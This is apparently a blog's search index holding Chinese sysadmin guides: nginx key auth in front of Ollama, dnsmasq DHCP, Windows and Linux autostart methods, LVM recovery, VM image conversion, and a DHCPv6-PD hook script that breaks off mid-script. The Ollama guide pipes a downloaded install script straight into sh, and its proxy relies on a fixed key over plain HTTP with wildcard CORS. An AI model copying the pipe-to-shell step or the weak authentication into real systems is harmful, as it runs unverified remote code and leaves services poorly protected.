<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ollama使用nginx辅助开启认证</title>
      <link href="/2025/03/06/Tools/ollama/"/>
      <url>/2025/03/06/Tools/ollama/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Ollama使用nginx辅助开启简单认证，便于公网开放有限访问。固定KEY方式，不区分用户身份，使用时注意替换命令中<code>REPLACE_YOUR_API_KEY_HERE</code>字段</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装ollama</span></span><br><span class="line">curl -fsSL https://ollama.com/install.sh | sh</span><br><span class="line"><span class="comment"># 安装nginx</span></span><br><span class="line">apt upadte &amp;&amp; apt install nginx -y</span><br></pre></td></tr></table></figure><h1 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/nginx/sites-enabled/ollama &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">server &#123;</span></span><br><span class="line"><span class="string">    listen 80;  # 或者 443 如果你使用 HTTPS</span></span><br><span class="line"><span class="string">    server_name _; # 或者你的服务器IP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    location / &#123;</span></span><br><span class="line"><span class="string">        # Ollama API 的反向代理设置</span></span><br><span class="line"><span class="string">        proxy_pass http://localhost:11434;</span></span><br><span class="line"><span class="string">        proxy_set_header Host localhost; # 设为固定localhost</span></span><br><span class="line"><span class="string">        proxy_set_header Origin &quot;&quot;; # 清理origin头</span></span><br><span class="line"><span class="string">        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;</span></span><br><span class="line"><span class="string">        add_header Access-Control-Allow-Origin &quot;*&quot;; # 允许跨域</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        # API Key 认证配置</span></span><br><span class="line"><span class="string">        if (\$http_authorization != &quot;Bearer REPLACE_YOUR_API_KEY_HERE&quot;) &#123;</span></span><br><span class="line"><span class="string">            return 401;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl http://&#123;nginx_ip:nginx_port&#125;/v1/chat/completions \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">    -H <span class="string">&quot;Authorization: Bearer REPLACE_YOUR_API_KEY_HERE&quot;</span> \</span><br><span class="line">    -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">        &quot;model&quot;: &quot;gemma2:2b&quot;,</span></span><br><span class="line"><span class="string">        &quot;messages&quot;: [</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;role&quot;: &quot;system&quot;,</span></span><br><span class="line"><span class="string">                &quot;content&quot;: &quot;You are a helpful assistant.&quot;</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;role&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">                &quot;content&quot;: &quot;Hello!&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        ]</span></span><br><span class="line"><span class="string">    &#125;&#x27;</span> -v</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> Ollama </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用dnsmasq部署DHCPv4服务</title>
      <link href="/2024/06/19/Network/dhcp/"/>
      <url>/2024/06/19/Network/dhcp/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dnsmasq</span><br></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>新建文件<code>/etc/dnsmasq.d/dhcp-server</code>：</p><blockquote><p>配置项意义参考<code>dnsmasq</code>的<code>man手册</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">interface=ens3</span><br><span class="line">port=0</span><br><span class="line">bind-interfaces</span><br><span class="line"></span><br><span class="line">dhcp-range=set:rangev4, 192.168.193.2, 192.168.193.253, 255.255.255.0, 2h</span><br><span class="line">dhcp-option=tag:rangev4, option:dns-server, 223.5.5.5, 119.29.29.29</span><br><span class="line">dhcp-option=tag:rangev4, option:router, 192.168.193.1</span><br><span class="line">dhcp-leasefile=/var/lib/dhcp/dnsmasq.leases</span><br><span class="line"></span><br><span class="line">cache-size=150</span><br><span class="line"></span><br><span class="line">log-dhcp</span><br><span class="line"></span><br><span class="line">#conf-file=/etc/dnsmasq.more.conf</span><br><span class="line">#conf-dir=/etc/dnsmasq.d</span><br><span class="line"></span><br><span class="line">dhcp-name-match=set:wpad-ignore,wpad</span><br><span class="line">dhcp-ignore-names=tag:wpad-ignore</span><br></pre></td></tr></table></figure><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p><code>dnsmasq.service</code>：</p><blockquote><p>正常安装<code>dnsmasq</code>会自动生成<code>dnsmasq.service</code>，同样的，要确保<code>ens3</code>已创建成功后启动，所以<code>Wants</code>&amp;<code>After</code>后追加<code>NetworkManager-wait-online.service</code>，此service脚本供参考。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=dnsmasq - A lightweight DHCP and caching DNS server</span><br><span class="line">Requires=network.target</span><br><span class="line">Wants=nss-lookup.target NetworkManager-wait-online.service</span><br><span class="line">Before=nss-lookup.target</span><br><span class="line">After=network.target NetworkManager-wait-online.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>重新启动<code>dnsmasq</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> dnsmasq</span><br><span class="line">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> DHCP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCPv4 </tag>
            
            <tag> IPv4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows/Linux开机自启服务配置</title>
      <link href="/2024/06/06/Tools/autostart/"/>
      <url>/2024/06/06/Tools/autostart/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>新建项，值类型通常是<code>REG_SZ</code>，值填写程序绝对路径。</p><p>快速添加命令(<code>/d</code>后的exe绝对路径如果有空格，需要用<code>&quot;&quot;</code>包裹并转义):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /v ServiceName /t REG_SZ /d &quot;\&quot;path\to\exe\&quot; -arg1 -arg2&quot;</span><br><span class="line"># HKCU\Software\Microsoft\Windows\CurrentVersion\Run 仅对当前登录用户生效</span><br></pre></td></tr></table></figure><blockquote><p>注意: 开机后需要登录用户，准确来说是用户登录自启动</p></blockquote><h2 id="用户启动目录"><a href="#用户启动目录" class="headerlink" title="用户启动目录"></a>用户启动目录</h2><p>将程序快捷方式放进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[User]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup # 对指定的User生效</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp # 对所有用户生效</span><br></pre></td></tr></table></figure><blockquote><p>注意: 开机后需要登录用户，准确来说是用户登录自启动</p></blockquote><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>在<code>管理-&gt;系统工具-&gt;任务计划程序</code>新建计划任务。</p><p>部分配置项解释：</p><ul><li><p><code>安全选项-&gt;不管用户是否登录都要运行</code>: 开机自启类任务必选。</p></li><li><p><code>安全选项-&gt;不管用户是否登录都要运行-&gt;不存储密码。该任务将只有访问本地计算机资源的权限</code>: 选中后（GPT给的解释）：</p><ul><li>网络资源访问受限：任务将无法访问网络共享、远程服务器或其他需要身份验证的网络资源。因为没有存储密码，任务无法进行网络身份验证。</li><li>用户特定资源访问受限：任务将无法访问特定用户的资源，比如用户的加密文件、特定用户的注册表项等。这是因为任务运行时没有用户凭证。</li><li>无法进行特定的身份验证操作：某些操作可能需要用户的凭证进行身份验证，比如访问某些系统服务或执行需要管理员权限的操作。如果没有存储密码，这些操作可能会失败。</li><li>受限于本地计算机权限：任务只能访问和操作本地计算机上的资源，且只能使用计划任务运行时的权限。如果任务需要更高的权限来操作某些系统资源，可能会遇到权限不足的情况。</li></ul><p>总的来说，这个选项主要是为了确保任务可以在不需要用户登录的情况下运行，但同时也限制了任务的权限范围，确保任务不会因为缺少用户凭证而尝试访问不应访问的资源。请根据程序情况自行测试。</p></li><li><p><code>安全选项-&gt;使用最高权限运行</code>: 任务将以最高权限（通常是管理员权限）在本地计算机上运行。这意味着它可以执行需要管理员权限的操作，如修改系统设置、访问受保护的系统文件和注册表项等，但仍然受限于系统的安全策略和权限管理。请根据程序情况自行测试。</p></li><li><p><code>触发器</code>: 开机自启应选择<code>启动时</code>触发器。</p></li><li><p><code>操作</code>: 指定程序路径和参数。</p></li><li><p><code>条件-&gt;电源-&gt;只有在计算机使用交流电源时才启动此任务</code>: 不选中。</p></li><li><p><code>条件-&gt;网络</code>: 请根据程序情况自行测试，通常无需选中。</p></li><li><p><code>设置-&gt;如果过了计划开始时间，立即启动任务</code>: 通常选中。</p></li><li><p><code>设置-&gt;如果任务运行时间超过以下时间，停止任务</code>: <strong>不具有daemon特性</strong>的程序不要选中，任务启动后可在计划任务中看到任务状态为<code>正在运行</code>，<strong>具有daemon特性</strong>的程序通常选中。</p></li><li><p><code>设置-&gt;如果请求后任务还在运行，强行将其停止</code>: 确保单实例，通常选中。</p></li><li><p><code>设置-&gt;如果此任务已经运行，以下规则适用</code>: 确保单实例，选择<code>请勿启动新实例</code>。</p></li></ul><blockquote><p>daemon特性: 直接运行或shell中运行后自动进入后台，即使shell终止也不影响，则具有类似Linux的daemon特性。 </p></blockquote><h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><p><code>gpedit.msc-&gt;计算机配置-&gt;Windows设置-&gt;脚本（启动/关机）</code>添加启动任务</p><blockquote><p>专业版以上或Server版Windows才支持组策略</p></blockquote><h2 id="Service服务"><a href="#Service服务" class="headerlink" title="Service服务"></a>Service服务</h2><p>几种办法：</p><ul><li>使用bat（暂未测试）: <code>sc create TestSc binPath= D:\fullpath\to\your\program\start.bat start= auto</code></li><li>使用<a href="https://nssm.cc/">nssm</a>代理。</li><li>根据Windows Service编程规范，自行编写C&#x2F;C++实现ServiceMain入口点等规范。</li></ul><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>service配置文件路径: <code>/etc/systemd/system</code>或<code>/usr/lib/systemd/system</code></p><p>编写<code>xxx.service</code>并放入上述路径之一。例如frps: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Frp Server Service</span><br><span class="line">After=network.target network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=nobody</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=5s</span><br><span class="line">ExecStart=/usr/bin/frps -c /etc/frp/frps.ini</span><br><span class="line">LimitNOFILE=1048576</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload <span class="comment"># 重加载daemon服务清单</span></span><br><span class="line">systemctl <span class="built_in">enable</span> frps.service <span class="comment"># 加入自启动</span></span><br><span class="line">systemctl start frps.service <span class="comment"># 启动服务</span></span><br><span class="line">systemctl status frps.service <span class="comment"># 状态查询</span></span><br></pre></td></tr></table></figure><h2 id="rc-local"><a href="#rc-local" class="headerlink" title="rc.local"></a>rc.local</h2><p><code>/etc/rc.local</code>本质是一个shell脚本，Linux启动时会自动执行这个脚本，所以编辑<code>/etc/rc.local</code>，按照sh脚本启动程序的方式启动，注意不要阻塞脚本结束，对于那些非daemon的程序，可以启动行末尾加个<code>&amp;</code>让它后台运行。</p><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>在Windows中，使用vbs将非daemon的程序daemon化：</p><p><code>run.vbs</code>:</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> objWMIService = GetObject(<span class="string">&quot;winmgmts:&#123;impersonationLevel=impersonate&#125;!\\.\root\cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> arrProcesses = objWMIService.ExecQuery( <span class="string">&quot;select * from win32_process where Name =&#x27;frpc.exe&#x27;&quot;</span> )</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> proccess <span class="keyword">In</span> arrProcesses</span><br><span class="line">proccess.Terminate <span class="number">0</span> </span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> ws = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">ws.currentdirectory = <span class="string">&quot;.&quot;</span></span><br><span class="line">ws.run <span class="string">&quot;frpc.exe -c frpc.ini&quot;</span>,<span class="number">0</span></span><br><span class="line">WScript.echo <span class="string">&quot;frpc started&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> autostart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux LVM分区信息恢复</title>
      <link href="/2023/10/17/Tools/lvm_fix/"/>
      <url>/2023/10/17/Tools/lvm_fix/</url>
      
        <content type="html"><![CDATA[<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>在迁移虚拟机时，尤其是kvm迁移到vmware，如果原虚拟磁盘控制器使用了virtio半虚拟化，那Linux客户机的硬盘设备文件将是<code>/dev/vda</code>而不是<code>/dev/sda</code>，迁移到vmware后，<code>/dev/vda</code>丢失。此时如果使用了lvm分区，那么lvm会丢失<code>pv</code>（物理卷）的信息，表现为开机提示找不到启动磁盘。</p><h1 id="LVM配置备份文件"><a href="#LVM配置备份文件" class="headerlink" title="LVM配置备份文件"></a>LVM配置备份文件</h1><p>Linux会对lvm进行配置备份，以每一个<code>vg</code>（卷组）为一个文件，存放在<code>/etc/lvm/backup</code>文件夹。</p><h1 id="LVM恢复"><a href="#LVM恢复" class="headerlink" title="LVM恢复"></a>LVM恢复</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看lvm配置文件备份内容</span></span><br><span class="line"><span class="built_in">cat</span> /etc/lvm/backup/vgname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据vgname中备份的pv uuid重建pv，restorefile参数是指利用配置备份来进行pv的信息恢复</span></span><br><span class="line">pvcreate /dev/sda -u pv_uuid --restorefile /etc/lvm/backup/vgname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复vg信息</span></span><br><span class="line">vgcfgrestore vgname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查vg、pv、lv信息是否都已恢复</span></span><br><span class="line">vgs &amp;&amp; pvs &amp;&amp; lvs </span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后重新激活vg</span></span><br><span class="line">vgchange -ay vgname</span><br></pre></td></tr></table></figure><blockquote><p>注意，如果不重启，无法恢复lvm信息，因为pv、vg、lv在&#x2F;dev&#x2F;目录下会存在设备描述文件，重启后才能完全恢复。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> LVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各类虚拟镜像转换</title>
      <link href="/2023/10/17/Tools/vmimage/"/>
      <url>/2023/10/17/Tools/vmimage/</url>
      
        <content type="html"><![CDATA[<h1 id="pve导入vmware制作的虚拟机"><a href="#pve导入vmware制作的虚拟机" class="headerlink" title="pve导入vmware制作的虚拟机"></a>pve导入vmware制作的虚拟机</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vmid: pve虚拟机ID</span></span><br><span class="line"><span class="comment"># storage pool: pve储存池（例如local-lvm）</span></span><br><span class="line"><span class="comment"># disk-fs: 虚拟磁盘格式，有raw/qcow2/vmdk</span></span><br><span class="line">qm importovf &lt;vmid&gt; &lt;**.ovf&gt;  &lt;storage pool&gt; --format &lt;disk-fs&gt;</span><br></pre></td></tr></table></figure><h1 id="pve提取虚拟机镜像"><a href="#pve提取虚拟机镜像" class="headerlink" title="pve提取虚拟机镜像"></a>pve提取虚拟机镜像</h1><ul><li>方法一:<ol><li>从pve中备份要导出的虚拟机</li><li>从<code>/var/lib/vz/dump</code>找到对应的<code>vzdump-qemu-xxx.vma.zst</code>备份文件</li><li>zst解压缩：<code>zstd -d vzdump-qemu-xxx.vma.zst</code></li><li>vma提取raw镜像文件到<code>extract</code>目录：<code>vma extract vzdump-qemu-xxx.vma extract</code></li><li><code>cd extract</code>，下载<code>.raw</code>镜像</li></ol></li><li>方法二:<ol><li>虚拟机关机</li><li>pve虚拟机<code>硬件-&gt;硬盘</code>确定虚拟硬盘文件名，pve宿主中执行<code>fdisk -l</code>找到类似<code>/dev/mapper/pve-vm--101--disk--0</code>的设备文件路径</li><li>该设备文件为<code>raw</code>格式，使用<code>qemu-img</code>转换为其他镜像格式后下载</li></ol></li></ul><h1 id="硬盘镜像转换"><a href="#硬盘镜像转换" class="headerlink" title="硬盘镜像转换"></a>硬盘镜像转换</h1><p>vmdk &lt;-&gt; qcow2 &lt;-&gt; raw：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -p: 显示百分比进度</span></span><br><span class="line"><span class="comment"># -c: 启用镜像压缩，仅当-O为qcow2时才有效</span></span><br><span class="line"><span class="comment"># -f &lt;vmdk/raw/qcow2&gt;: 源镜像格式</span></span><br><span class="line"><span class="comment"># -O &lt;vmdk/raw/qcow2&gt;: 目的镜像格式</span></span><br><span class="line">qemu-img -p -c -f raw -O vmdk source.raw dest.vmdk</span><br></pre></td></tr></table></figure><p>如果是导入到ESXi，则要在ESXi执行vmdk镜像二次转换:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -i: 转换</span></span><br><span class="line"><span class="comment"># -d &lt;thin/zeroedthick/eagerzeroedthick&gt;: 精简制备/厚制备(延迟置零)/厚制备(立即置零)</span></span><br><span class="line">vmkfstools -i source.vmdk converted.vmdk -d thin</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟镜像 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义简易DHCPv6-PD路由</title>
      <link href="/2023/06/07/Network/router/"/>
      <url>/2023/06/07/Network/router/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装<code>dnsmasq</code>和<code>dhclient</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dnsmasq dhclient</span><br></pre></td></tr></table></figure><p>使用<code>brctl</code>新增目的网桥（重启会消失），如果需要持久化，使用<code>NetworkManager</code>或<code>netplan</code>。</p><p>此处假定目的网桥名称为<code>vbr0</code>，连接到网络的接口名称为<code>eth0</code>。</p><h1 id="dhclient配置"><a href="#dhclient配置" class="headerlink" title="dhclient配置"></a>dhclient配置</h1><p><code>dhclient</code>作用是<code>DHCPv6-PD</code>客户端，从上级路由获取PD前缀。</p><h2 id="hook脚本"><a href="#hook脚本" class="headerlink" title="hook脚本"></a>hook脚本</h2><p>新建文件<code>/etc/dhcp/dhclient-exit-hooks.d/dhcpv6-pd</code>：</p><blockquote><p>脚本参考<a href="https://github.com/jaymzh/v6-gw-scripts">jaymzh&#x2F;v6-gw-scripts&#x2F;dhclient-ipv6</a>，此处经过简化</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">EXT_IFACE=<span class="string">&#x27;eth0&#x27;</span></span><br><span class="line">INT_IFACE=<span class="string">&#x27;vbr0&#x27;</span></span><br><span class="line">OTHER_IFACES=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">STATE_DIR=/var/lib/dhcp/dhclient-ipv6-mapping</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">set_iaid_mapping</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> iaid=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">local</span> iface=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$iface</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$STATE_DIR</span>/iaid_<span class="variable">$iaid</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_interface</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> iaid=<span class="variable">$1</span></span><br><span class="line">  <span class="keyword">if</span> [ ! -d <span class="variable">$STATE_DIR</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkdir</span> -p <span class="variable">$STATE_DIR</span></span><br><span class="line">    set_iaid_mapping <span class="string">&quot;<span class="variable">$iaid</span>&quot;</span> <span class="string">&quot;<span class="variable">$INT_IFACE</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$INT_IFACE</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ls</span> <span class="variable">$STATE_DIR</span>/iaid_* &gt;/dev/null 2&gt;/dev/null</span><br><span class="line">  <span class="keyword">if</span> [ $? -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$INT_IFACE</span></span><br><span class="line">    set_iaid_mapping <span class="string">&quot;<span class="variable">$iaid</span>&quot;</span> <span class="string">&quot;<span class="variable">$INT_IFACE</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># if we&#x27;ve mapped this iaid to an interface, just cat it out</span></span><br><span class="line">  <span class="keyword">if</span> [ -e <span class="string">&quot;<span class="variable">$STATE_DIR</span>/iaid_<span class="variable">$iaid</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span 